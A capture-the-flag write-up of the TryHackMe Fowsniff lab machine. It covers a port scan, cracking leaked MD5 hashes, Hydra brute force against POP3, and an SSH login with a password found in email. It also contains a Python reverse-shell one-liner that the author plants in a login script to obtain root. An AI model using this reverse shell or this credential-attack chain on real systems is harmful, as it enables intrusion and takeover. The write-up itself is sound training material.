
# TryHackMe - Fowsniff Writeup

## Table of Contents
1. [Challenge Information](#challenge-information)
2. [Description](#description)
3. [Solution](#solution)
   - [Step 1: Initial Enumeration](#step-1-initial-enumeration)
   - [Step 2: Exploitation](#step-2-exploitation)
   - [Step 3: Post-Exploitation](#step-3-post-exploitation)
4. [Lessons Learned](#lessons-learned)
5. [Conclusion](#conclusion)

## Challenge Information
- **CTF Name:** TryHackMe - Fowsniff
- **Category:** Network Exploitation, Miscellaneous
- **Difficulty:** Beginner

## Description
In this challenge, I exploited a vulnerable system by leveraging a series of enumeration and exploitation techniques, ultimately gaining root access. 
The process involved discovering open ports, identifying leaked credentials, and using those credentials to gain deeper access to the system.

## Solution

### Step 1: Initial Enumeration

#### Nmap Scan
I started with an Nmap scan to identify open ports and services on the target machine.

```bash
nmap -sCV -p- -v -oN nmap 10.10.221.62
```

![Pasted image 20240726230132](https://github.com/user-attachments/assets/74217147-3e69-4cdf-8f7c-85eea28a9cfe)

### Step 2: Exploitation

#### Exploring the Website
I visited the website hosted on the target machine, which provided some basic information.

![Pasted image 20240726231949](https://github.com/user-attachments/assets/690d7295-0ac8-4eac-85ae-b93864afd0e8)

I found a reference to a Twitter page.

![Pasted image 20240726232005](https://github.com/user-attachments/assets/538bf83a-4405-430f-91c6-7f1d9521a007)

#### Discovering Leaked Credentials
On the website, I found a leaked credentials message from a hacker named B1gN1nj4, who had posted various usernames and their MD5 hashed passwords.

```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4
```

#### Cracking the Hashes
I cut the credentials and used CrackStation to crack the MD5 hashes.

![Pasted image 20240726233249](https://github.com/user-attachments/assets/d6899648-7318-4f4c-8691-b9d1ae4e34b1)
![Pasted image 20240726233342](https://github.com/user-attachments/assets/366587fb-0b23-4aac-89ae-0ed62d64df17)
![Pasted image 20240726234644](https://github.com/user-attachments/assets/4fe9515b-4487-4a37-9200-1c8960098cce)
![Pasted image 20240726234715](https://github.com/user-attachments/assets/75759cad-f51b-4357-8e00-98b17485b1fe)

I then joined the usernames and cracked passwords using `paste`.

![Pasted image 20240729175628](https://github.com/user-attachments/assets/118eecfa-98df-482b-a3bc-f6dd34f2d5b7)
![Pasted image 20240727000846](https://github.com/user-attachments/assets/d2dfdd2e-7190-484e-837f-7e45a6ff76e4)

### Step 3: Post-Exploitation

#### Brute-forcing POP3 with Hydra
Using the cracked credentials, I used Hydra to brute-force login attempts on the POP3 service.

![Pasted image 20240727000958](https://github.com/user-attachments/assets/53de22d3-73ad-456f-9508-391ede57ebe0)

#### Logging in through Telnet
Once I had valid credentials, I logged in through Telnet.

![Pasted image 20240727001216](https://github.com/user-attachments/assets/38fbd9f9-ac11-4928-bba5-5f21f85d1237)

After logging in, I listed the emails on the server.

![Pasted image 20240727001316](https://github.com/user-attachments/assets/8d3f8f94-9715-4235-b837-b5294d842708)

I read the first email using `RETR 1`, which contained a message about a security breach and provided a temporary SSH password.
```
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

I also read the second email using `RETR 2`, which contained some casual office gossip and reminded the recipient to change their email password.
```
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

#### SSH Access and Privilege Escalation
Using the provided SSH credentials from the email, I logged into the SSH service.

![Pasted image 20240727001908](https://github.com/user-attachments/assets/d3de5ebc-c219-451b-975b-b6dcf76f1a4f)

Once logged in, I found a file with rwx permissions in the `/opt/cube` directory.

![Pasted image 20240727003104](https://github.com/user-attachments/assets/aa381421-0d5f-4eaa-97e9-aeb3bbdf29b0)

This file appeared to be executed on SSH login, so I inserted a reverse shell payload into it.
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.3.207",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

On my attacker machine, I set up a listener:
```bash
nc -lvnp 1234
```

After SSHing in again, I received a reverse shell and gained root access.

![Pasted image 20240729173957](https://github.com/user-attachments/assets/5f9a8220-d86f-4fd0-ad52-646d1829768c)

I navigated to the `/root` directory and captured the flag.

![Pasted image 20240729174111](https://github.com/user-attachments/assets/1d39d451-bf62-422b-b23a-50fa4abb6330)

## Lessons Learned
- Enumeration is critical for identifying potential attack vectors.
- Leaked credentials and password cracking are effective methods for gaining initial access.
- Understanding the structure and function of various files and services can reveal ways to escalate privileges.
- Automated tools like Hydra and CrackStation significantly streamline the process of exploiting vulnerable services.

## Conclusion
This challenge was a comprehensive exercise in exploiting a series of vulnerabilities to gain root access. 
The process involved thorough enumeration, a bit of OSINT research,  credential discovery, and effective exploitation techniques. 
The experience highlighted the importance of diligent enumeration and the utility of various tools and methods in penetration testing.
